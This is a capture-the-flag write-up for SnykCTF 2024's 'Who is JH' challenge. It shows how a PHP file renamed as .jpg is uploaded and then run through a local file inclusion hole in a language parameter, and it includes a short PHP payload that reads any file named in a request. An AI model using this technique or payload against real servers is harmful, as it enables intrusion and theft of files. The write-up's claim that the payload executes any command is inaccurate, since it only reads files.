# Challenge Statement 
![image](https://github.com/user-attachments/assets/e9f72d09-1e0c-4cb7-8a11-01be8532e699)

Attachment: [Who is JH.zip](https://github.com/harishkannan05/SnykCTF-2024-Writeup/blob/main/Attachments/Who%20is%20JH.zip)

# Solution
Exploring the webapp, we find `/upload.php` where we can upload image files only (JPG, PNG, GIF).
![image](https://github.com/user-attachments/assets/49e91284-1289-4518-a5a8-5ddc35909057)

We also find the `/conspiracy.php` which has two language filters which changes the URL to `?language=languages/french.php`. This indicates the possibility of a **LFI vulnerability**. <br />

Going through the source code, we find `log.php`, which shows `/logs/site_log.txt` where all the logs are being stored. Here we can see that the uploaded files are being renamed. <br />
![image](https://github.com/user-attachments/assets/979ab69b-e313-4349-b62e-9ecbd0fb5dd6)

Now we just have to upload a php file with the .jpg extension and using `/conspiracy.php?language=uploads/(.php.jpg file)` we can execute it. <br />
The php file I used it - 
```
<?php
if(isset($_REQUEST['cmd'])) {
    echo "<pre>";
    echo file_get_contents($_REQUEST['cmd']);
    echo "</pre>";
}
?>
```

Now, we can execute any command using the LFI vulnerability.
![image](https://github.com/user-attachments/assets/283efb94-662c-4f11-ba51-5d2e4d591e7f)

